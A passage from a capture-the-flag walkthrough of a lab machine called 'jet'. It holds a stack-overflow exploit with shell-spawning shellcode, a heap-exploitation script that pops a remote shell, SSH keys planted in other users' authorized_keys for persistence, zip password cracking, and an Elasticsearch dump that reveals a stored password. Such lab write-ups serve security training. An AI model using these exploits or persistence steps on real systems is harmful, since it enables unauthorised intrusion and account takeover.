cnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAu

dGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5m

aW5pX2FycmF5AC5qY3IALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAABsAAAABAAAAAgAAAAAAAAA4AkAAAAAAADgCAAAAAAAAHAAAAAAAAAAAAAAAAAAA

AAEAAAAAAAAAAAAAAAAAAAAjAAAABwAAAAIAAAAAAAAAVAJAAAAAAABUAgAAAAAAACAAAAAAAAAA

AAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAMQAAAAcAAAACAAAAAAAAAHQCQAAAAAAAdAIAAAAAAAAk

AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAD2//9vAgAAAAAAAACYAkAAAAAAAJgC

AAAAAAAAMAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABOAAAACwAAAAIAAAAAAAAAyAJA

AAAAAADIAgAAAAAAADgBAAAAAAAABgAAAAEAAAAIAAAAAAAAABgAAAAAAAAAVgAAAAMAAAACAAAA

AAAAAAAEQAAAAAAAAAQAAAAAAAB4AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAF4AAAD/

//9vAgAAAAAAAAB4BEAAAAAAAHgEAAAAAAAAGgAAAAAAAAAFAAAAAAAAAAIAAAAAAAAAAgAAAAAA

AABrAAAA/v//bwIAAAAAAAAAmARAAAAAAACYBAAAAAAAACAAAAAAAAAABgAAAAEAAAAIAAAAAAAA

AAAAAAAAAAAAegAAAAQAAAACAAAAAAAAALgEQAAAAAAAuAQAAAAAAABgAAAAAAAAAAUAAAAAAAAA

CAAAAAAAAAAYAAAAAAAAAIQAAAAEAAAAQgAAAAAAAAAYBUAAAAAAABgFAAAAAAAAwAAAAAAAAAAF

AAAAGAAAAAgAAAAAAAAAGAAAAAAAAACOAAAAAQAAAAYAAAAAAAAA2AVAAAAAAADYBQAAAAAAABoA

AAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAiQAAAAEAAAAGAAAAAAAAAAAGQAAAAAAAAAYA

AAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJQAAAABAAAABgAAAAAAAACQBkAA

AAAAAJAGAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACdAAAAAQAAAAYAAAAA

AAAAoAZAAAAAAACgBgAAAAAAAGICAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAowAAAAEA

AAAGAAAAAAAAAAQJQAAAAAAABAkAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAA

AKkAAAABAAAAAgAAAAAAAAAQCUAAAAAAABAJAAAAAAAAOQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAA

AAAAAAAAAACxAAAAAQAAAAIAAAAAAAAATAlAAAAAAABMCQAAAAAAAEQAAAAAAAAAAAAAAAAAAAAE

AAAAAAAAAAAAAAAAAAAAvwAAAAEAAAACAAAAAAAAAJAJQAAAAAAAkAkAAAAAAAA0AQAAAAAAAAAA

AAAAAAAACAAAAAAAAAAAAAAAAAAAAMkAAAAOAAAAAwAAAAAAAAAQDmAAAAAAABAOAAAAAAAACAAA

AAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADVAAAADwAAAAMAAAAAAAAAGA5gAAAAAAAYDgAA

AAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA4QAAAAEAAAADAAAAAAAAACAOYAAA

AAAAIA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOYAAAAGAAAAAwAAAAAA

AAAoDmAAAAAAACgOAAAAAAAA0AEAAAAAAAAGAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACYAAAAAQAA

AAMAAAAAAAAA+A9gAAAAAAD4DwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA

7wAAAAEAAAADAAAAAAAAAAAQYAAAAAAAABAAAAAAAABYAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAI

AAAAAAAAAPgAAAABAAAAAwAAAAAAAABYEGAAAAAAAFgQAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgA

AAAAAAAAAAAAAAAAAAD+AAAACAAAAAMAAAAAAAAAgBBgAAAAAABoEAAAAAAAADAAAAAAAAAAAAAA

AAAAAAAgAAAAAAAAAAAAAAAAAAAAAwEAAAEAAAAwAAAAAAAAAAAAAAAAAAAAaBAAAAAAAAA0AAAA

AAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAMUaAAAA

AAAADAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAA

AACgEAAAAAAAAFAHAAAAAAAAHgAAAC8AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAA

AAAAAAAAAAAA8BcAAAAAAADVAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==" | base64 -d > leak



kali@kali:chmod +x leak                                                                                                                                           



kali@kali:./leak                                                                                                                                                  

Oops, I'm leaking! 0x7ffc497c0c40

Pwn me ¯\\\_(ツ)\_/¯ 

> 





I am very bad at binary pwns, after some research I found out that the binary was leaking RSP address and we also found that the offset is 72.



For this, Kill any process running at port 60001, then run the service again.



www-data@jet:/home$ fuser -k 60001/tcp



www-data@jet:/home$ socat TCP4-LISTEN:60001,reuseaddr,fork EXEC:/home/leak \&

\[1] 8017



www-data@jet:/home$ ss -lntp | grep 60001

LISTEN     0      5            \*:60001                    \*:\*                   users:(("socat",pid=8017,fd=6))





Create a python file, pwner.py

I tried to use pwn, but pwn is not available there.



import socket

import struct

import sys

import select



HOST = "127.0.0.1"

PORT = 60001



s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)

s.connect((HOST, PORT))



data = s.recv(1024)

sys.stdout.buffer.write(data)



leak = int(data.split(b"0x")\[1].split()\[0], 16)

print(hex(leak))



shellcode = (                                                                                                                                                

&nbsp;   b"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff"                                                                                                      

&nbsp;   b"\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e"                                                                                                          

&nbsp;   b"\\xb0\\x3b\\x0f\\x05"                                                                                                                                      

)                                                                                                                                                            

&nbsp;                                                                                                                                                            

payload  = shellcode                                                                                                                                         

payload += b"\\x90" \* (72 - len(shellcode))                                                                                                                   

payload += struct.pack("<Q", leak)                                                                                                                           

&nbsp;                                                                                                                                                            

s.sendall(payload + b"\\n")                                                                                                                                   

&nbsp;                                                                                                                                                            

\# proper interactive shell                                                                                                                                   

while True:

&nbsp;   r, \_, \_ = select.select(\[s, sys.stdin], \[], \[])

&nbsp;   if s in r:

&nbsp;       data = s.recv(4096)

&nbsp;       if not data:

&nbsp;           break

&nbsp;       sys.stdout.buffer.write(data)

&nbsp;       sys.stdout.buffer.flush()

&nbsp;   if sys.stdin in r:

&nbsp;       s.sendall(sys.stdin.buffer.readline())





Run the pwner.py.



www-data@jet:/tmp$ python3 pwner.py



Oops, I'm leaking! 0x7ffc4b2177d0

0x7ffc4b2177d0

Pwn me ¯\\\_(ツ)\_/¯ 

> id

uid=33(www-data) gid=33(www-data) euid=1005(alex) groups=33(www-data)





We see that alex euid has been added. 

Please note that this shell is unstable, so we hurry and keep our ssh keys to login as user alex.



At the attacker machine:



kali@kali:ssh-keygen -t rsa



Generating public/private rsa key pair.

Enter file in which to save the key (/home/kali/.ssh/id\_rsa): /home/kali/id.rsa

Enter passphrase for "/home/kali/id.rsa" (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/kali/id.rsa

Your public key has been saved in /home/kali/id.rsa.pub

The key fingerprint is:

SHA256:mvc5sWe52ruR4+GNYA+YKXNmMo2PvPzdC6wEBZqxNFQ kali@kali

The key's randomart image is:

+---\[RSA 3072]----+

|   .=.E          |

|   . \* .         |

|    +   .        |

|       .         |

|      . S        |

|       \* =.  .   |

|      O @ \*o=.   |

|     o \& =o@+\*   |

|      =o+ ==%=.  |

+----\[SHA256]-----+





kali@kali:cat id.rsa.pub



ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXFNozwPELMjO4rPXl7uVXeUnVwXL+50JOuT+VZGwe0ki52+Pn+o+bEuBtOxEziV14ig1yRdvCwEbkvkWnlZtdcfnFtd2zL8Wn0xfHwRIXY6seOL4RyuBwZpLEgUj1BgFnU8f79f6E8qYWG5Fhm7lrD1IYWBH4BPWkfzd6yinrokIGK1MDOh1ajDVttLI29lJdT9yW/J5Ewvl5EfMba29M5BaoGmYI9/mDw3qPowrLENtIVXtAyEzpbURkenPLAUnMDiB4YXqTSITEwwyx56UHj08eghgvHmeCaMOd/oetiN7Y2boXvVoLz3OMDacWCa04MLj6C91lQoEVEuyg95ViOzl6my+OsCLZhs7isR0zoFFVGDG6FwZQIe18M456TN8dw4jpA8bB5arR2IbC9ge2k2UQXw9DN/ulq12HBv8NgxYXMXpEDOwkEOLhMsrrP1N+Dxcp3+ToRDh0ON+FG/aW5g9B5SIPvBqEMTHvQF5t39LG/x5+hBcQfT0zL59vD7U= kali@kali





Copy this into the .ssh directory of user alex.



$ cd /home/alex



$ mkdir .ssh



$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXFNozwPELMjO4rPXl7uVXeUnVwXL+50JOuT+VZGwe0ki52+Pn+o+bEuBtOxEziV14ig1yRdvCwEbkvkWnlZtdcfnFtd2zL8Wn0xfHwRIXY6seOL4RyuBwZpLEgUj1BgFnU8f79f6E8qYWG5Fhm7lrD1IYWBH4BPWkfzd6yinrokIGK1MDOh1ajDVttLI29lJdT9yW/J5Ewvl5EfMba29M5BaoGmYI9/mDw3qPowrLENtIVXtAyEzpbURkenPLAUnMDiB4YXqTSITEwwyx56UHj08eghgvHmeCaMOd/oetiN7Y2boXvVoLz3OMDacWCa04MLj6C91lQoEVEuyg95ViOzl6my+OsCLZhs7isR0zoFFVGDG6FwZQIe18M456TN8dw4jpA8bB5arR2IbC9ge2k2UQXw9DN/ulq12HBv8NgxYXMXpEDOwkEOLhMsrrP1N+Dxcp3+ToRDh0ON+FG/aW5g9B5SIPvBqEMTHvQF5t39LG/x5+hBcQfT0zL59vD7U= kali@kali" > authorized\_keys



Back to the attacker machine, change permissions on the key and ssh login as user alex.



kali@kali:chmod 600 id.rsa                                                                                                                                         



kali@kali: ssh -i id.rsa alex@10.13.37.10  

&nbsp;                                                                                                                        

The authenticity of host '10.13.37.10 (10.13.37.10)' can't be established.

ED25519 key fingerprint is: SHA256:OQHuXrO8X75+NzxFa1JmQNvDcVHttNOYSZgajRpPkHc

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint])? yes

Warning: Permanently added '10.13.37.10' (ED25519) to the list of known hosts.

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86\_64)



&nbsp;\* Documentation:  https://help.ubuntu.com

&nbsp;\* Management:     https://landscape.canonical.com

&nbsp;\* Support:        https://ubuntu.com/advantage



321 packages can be updated.

235 updates are security updates.







The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.



Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.



alex@jet:~$ 







Now, at least we have some useful and interactive shell.



At the home directory of user alex, we find another flag, i.e. flag6 and some interesting files.





alex@jet:~$ ls

crypter.py  encrypted.txt  exploitme.zip  flag.txt



alex@jet:~$ cat flag.txt

JET{0.....z}



Flag6:JET{0.....z}





Let's take them to our attacker machine and analyze them.

We see that the zip file is password protected, let's crack it with john the ripper.



kali@kali:unzip exploitme.zip      

&nbsp;                                                                                                                               

Archive:  exploitme.zip

\[exploitme.zip] membermanager password: 





kali@kali:zip2john exploitme.zip > ziphash   

&nbsp;                                                                                                                     

ver 2.0 efh 5455 efh 7875 exploitme.zip/membermanager PKZIP Encr: TS\_chk, cmplen=3166, decmplen=10224, crc=32B64CF9 ts=4AC0 cs=4ac0 type=8

ver 2.0 efh 5455 efh 7875 exploitme.zip/memo PKZIP Encr: TS\_chk, cmplen=3775, decmplen=13304, crc=FC9CDB4F ts=4AC3 cs=4ac3 type=8

NOTE: It is assumed that all files in each archive have the same password.

If that is not the case, the hash may be uncrackable. To avoid this, use

option -o to pick a file at a time.





kali@kali:john ziphash --wordlist=/usr/share/wordlists/rockyou.txt    

&nbsp;                                                                                            

Using default input encoding: UTF-8

Loaded 1 password hash (PKZIP \[32/64])

Will run 4 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

0g 0:00:00:01 DONE (2026-01-30 12:26) 0g/s 10704Kp/s 10704Kc/s 10704KC/s "2parrow"..\*7¡Vamos!

Session completed.





The password is not in rockyou.txt, after some trial and error, I tried custom password and using keyword securewebinc as it was in the login portal too.



kali@kali:cat key.py



\#!/usr/bin/python3

import string, itertools



base = 'securewebinc'

length = 17

keys = \[base + s for s in map(''.join, itertools.product(string.ascii\_lowercase, repeat=length-len(base)))]  



with open('keys.txt', 'w') as file:

&nbsp;   for key in keys:

&nbsp;       file.write(key + '\\n')







This time we were able to crack the password.



kali@kali:john ziphash --wordlist=keys.txt 

&nbsp;                                                                                            

Using default input encoding: UTF-8

Loaded 1 password hash (PKZIP \[32/64])

Will run 4 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

sec.....ks (exploitme.zip)     

1g 0:00:00:00 DONE (2026-01-30 12:28) 1.538g/s 12338Kp/s 12338Kc/s 12338KC/s securewebincrnvtg..securewebincrohwh

Use the "--show" option to display all of the cracked passwords reliably

Session completed.





Unzipping the file, it drops 2 binaries, I think they will come in hand later.



kali@kali:unzip exploitme.zip   

&nbsp;                                                                                                                                  

Archive:  exploitme.zip

\[exploitme.zip] membermanager password: 

&nbsp; inflating: membermanager           

&nbsp; inflating: memo  





Now, let's use the same password as a key to decrypt the encrypted.txt.



kali@kali: cat decrypt.py



\#!/usr/bin/python3

import binascii



def makeList(stringVal):

&nbsp;   return \[c for c in stringVal]



def decrypt(hexVal, keyVal):

&nbsp;   keyPos = 0

&nbsp;   key = makeList(keyVal)

&nbsp;   xored = b''

&nbsp;   for i in range(0, len(hexVal), 2):

&nbsp;       byte = bytes.fromhex(hexVal\[i:i+2])\[0]

&nbsp;       xored += bytes(\[byte ^ ord(key\[keyPos])])  

&nbsp;       if keyPos == len(key) - 1:

&nbsp;           keyPos = 0

&nbsp;       else:

&nbsp;           keyPos += 1

&nbsp;   return xored.decode()



with open('encrypted.txt', 'rb') as f:

&nbsp;   content = f.read()

message = decrypt(content.hex(), 'sec.....ks')  

print(message)



kali@kali:python3 decrypt.py

&nbsp;                                                                                                                                      

Hello mate!



First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!



Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.

Make sure those binaries are kept safe!



To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.



The ports are 5555 and 7777.

Have fun and keep it safe!



JET{r.....d}





Cheers - Alex



-----------------------------------------------------------------------------

This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.

-----------------------------------------------------------------------------





we found another flag, and some interesting info too.



Flag7:JET{r.....d}



Now, we are given the hint telling "Elasticity", so it must be related to Elasticsearch.



alex@jet:~$ ss -tulnp



Netid State      Recv-Q Send-Q                               Local Address:Port                                              Peer Address:Port              

udp   UNCONN     0      0                                  192.168.122.100:53                                                           \*:\*                  

udp   UNCONN     0      0                                        127.0.0.1:53                                                           \*:\*                  

udp   UNCONN     0      0                                               :::53                                                          :::\*                  

tcp   LISTEN     0      128                                              \*:22                                                           \*:\*                  

tcp   LISTEN     0      128                                      127.0.0.1:953                                                          \*:\*                  

tcp   LISTEN     0      5                                                \*:60001                                                        \*:\*                  

tcp   LISTEN     0      5                                                \*:7777                                                         \*:\*                  

tcp   LISTEN     0      5                                                \*:5578                                                         \*:\*                  

tcp   LISTEN     0      80                                       127.0.0.1:3306                                                         \*:\*                  

tcp   LISTEN     0      5                                                \*:5324                                                         \*:\*                  

tcp   LISTEN     0      5                                                \*:9999                                                         \*:\*                  

tcp   LISTEN     0      128                                              \*:80                                                           \*:\*                  

tcp   LISTEN     0      5                                                \*:9201                                                         \*:\*                  

tcp   LISTEN     0      5                                                \*:5555                                                         \*:\*                  

tcp   LISTEN     0      10                                 192.168.122.100:53                                                           \*:\*                  

tcp   LISTEN     0      10                                       127.0.0.1:53                                                           \*:\*                  

tcp   LISTEN     0      128                                             :::22                                                          :::\*                  

tcp   LISTEN     0      128                                            ::1:953                                                         :::\*                  

tcp   LISTEN     0      128                               ::ffff:127.0.0.1:9200                                                        :::\*                  

tcp   LISTEN     0      128                               ::ffff:127.0.0.1:9300                                                        :::\*                  

tcp   LISTEN     0      10                                              :::53                                                          :::\*                  





We can see that the default port of Elastic Search 9200 and 9300 are open, so this is the next step.





Let's do port forwordaing.



kali@kali:ssh -i id.rsa alex@10.13.37.10 -L 9300:127.0.0.1:9300





We need to now compile and run a java program to dump all indices of the elasticsearch.



import java.util.Map;

import java.net.InetSocketAddress;

import java.net.InetAddress;

import org.elasticsearch.client.Client;

import org.elasticsearch.client.IndicesAdminClient;

import org.elasticsearch.client.transport.TransportClient;

import org.elasticsearch.transport.client.PreBuiltTransportClient;

import org.elasticsearch.search.SearchHit;

import org.elasticsearch.common.settings.Settings;

import org.elasticsearch.common.transport.TransportAddress;

import org.elasticsearch.cluster.health.ClusterIndexHealth;

import org.elasticsearch.action.admin.indices.exists.indices.IndicesExistsResponse;

import org.elasticsearch.action.admin.cluster.health.ClusterHealthResponse;

import org.elasticsearch.action.admin.indices.get.GetIndexResponse;

import org.elasticsearch.action.admin.indices.get.GetIndexRequest;

import org.elasticsearch.action.search.SearchResponse;



public class Program {

&nbsp;   public static void main(String\[] args) {

&nbsp;       byte\[] ipAddr = new byte\[]{127,0,0,1};

&nbsp;       Settings settings = Settings.builder()

&nbsp;               .put("cluster.name", "elasticsearch")

&nbsp;               .build();

&nbsp;       Client client = new PreBuiltTransportClient(Settings.EMPTY).addTransportAddress(new TransportAddress(new InetSocketAddress("127.0.0.1", 9300)));  

&nbsp;       System.out.println(client.toString());

&nbsp;       ClusterHealthResponse healths = client.admin().cluster().prepareHealth().get();

&nbsp;       for (ClusterIndexHealth health : healths.getIndices().values()) {

&nbsp;           System.out.println(health.getIndex());

&nbsp;       }

&nbsp;       SearchResponse search = client.prepareSearch("test").execute().actionGet();

&nbsp;       SearchHit\[] results = search.getHits().getHits();

&nbsp;       for (SearchHit hit : results) {

&nbsp;           System.out.println(hit.getSourceAsString());

&nbsp;       }

&nbsp;       client.close();

&nbsp;   }

}





<project xmlns="http://maven.apache.org/POM/4.0.0"

&nbsp;        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

&nbsp;        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

&nbsp;   <modelVersion>4.0.0</modelVersion>

&nbsp;   <groupId>com.example</groupId>

&nbsp;   <artifactId>elasticsearch-project</artifactId>

&nbsp;   <version>1.0-SNAPSHOT</version>

&nbsp;   <properties>

&nbsp;       <maven.compiler.source>1.8</maven.compiler.source>

&nbsp;       <maven.compiler.target>1.8</maven.compiler.target>

&nbsp;       <elasticsearch.version>5.6.4</elasticsearch.version>

&nbsp;   </properties>

&nbsp;   <dependencies>

&nbsp;       <dependency>

&nbsp;           <groupId>org.elasticsearch</groupId>

&nbsp;           <artifactId>elasticsearch</artifactId>

&nbsp;           <version>${elasticsearch.version}</version>

&nbsp;       </dependency>

&nbsp;       <dependency>

&nbsp;           <groupId>org.elasticsearch.client</groupId>

&nbsp;           <artifactId>transport</artifactId>

&nbsp;           <version>${elasticsearch.version}</version>

&nbsp;       </dependency>

&nbsp;       <dependency>

&nbsp;           <groupId>org.apache.logging.log4j</groupId>

&nbsp;           <artifactId>log4j-core</artifactId>

&nbsp;           <version>2.9.1</version>

&nbsp;       </dependency>

&nbsp;   </dependencies>

&nbsp;   <build>

&nbsp;       <plugins>

&nbsp;           <plugin>

&nbsp;               <groupId>org.apache.maven.plugins</groupId>

&nbsp;               <artifactId>maven-compiler-plugin</artifactId>

&nbsp;               <version>3.8.1</version>

&nbsp;               <configuration>

&nbsp;                   <source>1.8</source>

&nbsp;                   <target>1.8</target>

&nbsp;               </configuration>

&nbsp;           </plugin>

&nbsp;       </plugins>

&nbsp;   </build>

</project>



Now, complile and run.



kali@kali:mkdir -p src/main/java



kali@kali:mv Program.java src/main/java



kali@kali:mvn compile



kali@kali:mvn exec:java -Dexec.mainClass="Program"

.

.

.

.

{

&nbsp; "timestamp": "2017-11-13 08:31",

&nbsp; "subject": "Just a heads up Rob",

&nbsp; "category": "admin",

&nbsp; "draft": "no",

&nbsp; "body": "Hey Rob - just so you know, that information you wanted has beensent."

}

{

&nbsp; "timestamp": "2017-11-10 07:00",

&nbsp; "subject": "Maintenance",

&nbsp; "category": "maintenance",

&nbsp; "draft": "no",

&nbsp; "body": "Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday"

}

{

&nbsp; "timestamp": "2017-11-13 08:30",

&nbsp; "subject": "Details for upgrades to EU-API-7",

&nbsp; "category": "admin",

&nbsp; "draft": "yes",

&nbsp; "body": "Hey Rob, you asked for the password to the EU-API-7 instance. You didn not want me to send it on Slack, so I am putting it in here as a draft document. Delete this once you have copied the message, and don \_NOT\_ tell \_ANYONE\_. We need a better way of sharing secrets. The password is pu.....69. -Jason JET{3.....n}"  

}

{

&nbsp; "timestamp": "2017-11-13 13:32",

&nbsp; "subject": "Upgrades complete",

&nbsp; "category": "Maintenance",

&nbsp; "draft": "no",

&nbsp; "body": "All upgrades are complete, and normal service resumed"

}

{

&nbsp; "timestamp": "2017-11-09 15:13",

&nbsp; "subject": "Server outage",

&nbsp; "category": "outage",

&nbsp; "draft": "no",

&nbsp; "body": "Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed"

}

{

&nbsp; "timestamp": "2017-11-13 13:40",

&nbsp; "subject": "Thanks Jazz",

&nbsp; "category": "admin",

&nbsp; "draft": "no",

&nbsp; "body": "Thanks dude - all done. You can delete our little secret. Kind regards, Rob"

}

{

&nbsp; "timestamp": "2017-11-13 08:27",

&nbsp; "subject": "Upgrades",

&nbsp; "category": "maintenance",

&nbsp; "draft": "no",

&nbsp; "body": "An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances"

}





We find another flag, i.e. flag8 and a password.



Flag8:JET{3.....n}

Password:pu.....69





So, as I said I have very less knowledge for pwn, I take help from online resources.



kali@kali:cat member.py 



\#!/usr/bin/python3

from pwn import remote, p64, p16

&nbsp;                                                                                                                                                            

shell = remote("10.13.37.10", 5555)                                                                                                                          

&nbsp;                                                                                                                                                            

def add(size, data):                                                                                                                                         

&nbsp;   shell.sendlineafter(b"6. exit", b"1")                                                                                                                    

&nbsp;   shell.sendlineafter(b"size:", str(size).encode())                                                                                                        

&nbsp;   shell.sendlineafter(b"username:", data)                                                                                                                  

&nbsp;                                                                                                                                                            

def edit(idx, mode, data):                                                                                                                                   

&nbsp;   shell.sendline(b"2")                                                                                                                                     

&nbsp;   shell.sendlineafter(b"2. insecure edit", str(mode).encode())                                                                                             

&nbsp;   shell.sendlineafter(b"index:", str(idx).encode())                                                                                                        

&nbsp;   shell.sendlineafter(b"username:", data)                                                                                                                  

&nbsp;   shell.recvuntil(b"6. exit")



def ban(idx):

&nbsp;   shell.sendline(b"3")

&nbsp;   shell.sendlineafter(b"index:", str(idx).encode())

&nbsp;   shell.recvuntil(b"6. exit")



def change(data):

&nbsp;   shell.sendline(b"4")

&nbsp;   shell.sendlineafter(b"name:", data)

&nbsp;   shell.recvuntil(b"6. exit")



shell.sendlineafter(b"name:", b"A" \* 8)

add(0x88, b"A" \* 0x88)

add(0x100, b"A" \* 8)

payload  = b"A" \* 0x160

payload += p64(0)

payload += p64(0x21)

add(0x500, payload)

add(0x88, b"A" \* 8)

shell.recv()

ban(2)

payload  = b""

payload += b"A" \* 0x88

payload += p16(0x281)

edit(0, 2, payload)

shell.recv()

shell.sendline(b"5")

shell.recvline()

leak\_read = int(shell.recvline()\[:-1], 10)

libc\_base = leak\_read - 0xf7250

payload  = b""

payload += p64(0) \* 3

payload += p64(libc\_base + 0x45390)

change(payload)

payload  = b""

payload += b"A" \* 256

payload += b"/bin/sh\\x00"

payload += p64(0x61)

payload += p64(0)

payload += p64(libc\_base + 0x3c5520 - 0x10)

payload += p64(2)

payload += p64(3)

payload += p64(0) \* 21

payload += p64(0x6020a0)

edit(1, 1, payload)

shell.sendline(b"1")

shell.sendlineafter(b"size:", str(0x80).encode())

shell.recvuntil(b"\[vsyscall]")

shell.recvline()

shell.interactive()





So, after getting a shell, we will use a same method as before to keep a ssh key inside of membermanager directory.



kali@kali:python3 member.py



\[+] Opening connection to 10.13.37.10 on port 5555: Done

\[\*] Switching to interactive mode

$ id

uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)

$ cd /home/membermanager

$ mkdir .ssh

$ cd .ssh

$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSo21CWfN0igPSaQlyw3RmF6AmIib/ORK+LvnY4Jby2oe0bUgvGF63mcxjnEY0k+fherngfypKdcjonkc/ODSmNLlBc3FsgaxfMLvl5BuE+vY/x0AD9wPkt16zs5amG25tEDL3QMR8f7j1MCWc0/TGKNgbLXXQKarjlHZ1EUtTGOrKp3ZFl0xNspRI+R00njfuXTE7puJ0OM8B+w2C00wP2wI7k7XNd1Znqqls/8PyWOgOz6eeH5mCxYxojDShvfTjaJE/garrX1XD2+19YQ/2VBl2QTUpD8OAxunYuBTxAalddGKeKdf0yLuYzwm17lua1K862BYiGvKfOH5Y8BwjDnAg1FI0qMV1cvuyGUkHSYyZWlsvRcn1Rub//ti5T6Hznax2iBe4kUAWBzT03TmrTBuYJFZCpMyX0TM98q7MYrdtbrCZHf+WZo5CS3wjMaVrfbcafQOybyd1nFxoUuFXqCI0ajGmdj7sXySv29oZK+NdYodd46oZaiuEtiYoqV8= kali@kali" > authorized\_keys

$ cat authorized\_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSo21CWfN0igPSaQlyw3RmF6AmIib/ORK+LvnY4Jby2oe0bUgvGF63mcxjnEY0k+fherngfypKdcjonkc/ODSmNLlBc3FsgaxfMLvl5BuE+vY/x0AD9wPkt16zs5amG25tEDL3QMR8f7j1MCWc0/TGKNgbLXXQKarjlHZ1EUtTGOrKp3ZFl0xNspRI+R00njfuXTE7puJ0OM8B+w2C00wP2wI7k7XNd1Znqqls/8PyWOgOz6eeH5mCxYxojDShvfTjaJE/garrX1XD2+19YQ/2VBl2QTUpD8OAxunYuBTxAalddGKeKdf0yLuYzwm17lua1K862BYiGvKfOH5Y8BwjDnAg1FI0qMV1cvuyGUkHSYyZWlsvRcn1Rub//ti5T6Hznax2iBe4kUAWBzT03TmrTBuYJFZCpMyX0TM98q7MYrdtbrCZHf+WZo5CS3wjMaVrfbcafQOybyd1nFxoUuFXqCI0ajGmdj7sXySv29oZK+NdYodd46oZaiuEtiYoqV8= kali@kali





Now, similarly change the key permissions on the attacker machine and login via ssh as membermanager.



kali@kali:chmod 600 man\_rsa                                                                                                                                        



kali@kali:ssh -i man\_rsa membermanager@10.13.37.10  

&nbsp;                                                                                                              

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86\_64)



&nbsp;\* Documentation:  https://help.ubuntu.com

&nbsp;\* Management:     https://landscape.canonical.com

&nbsp;\* Support:        https://ubuntu.com/advantage



321 packages can be updated.

235 updates are security updates.







The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.



Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.



membermanager@jet:~$ 





We find our next flag, flag9 at the home directory.



membermanager@jet:~$ cat flag.txt

JET{h.....z}



&nbsp;                                                \_\_----~~~~~~~~~~~------\_\_\_

&nbsp;                                     .  .   ~~//====......          \_\_--~ ~~

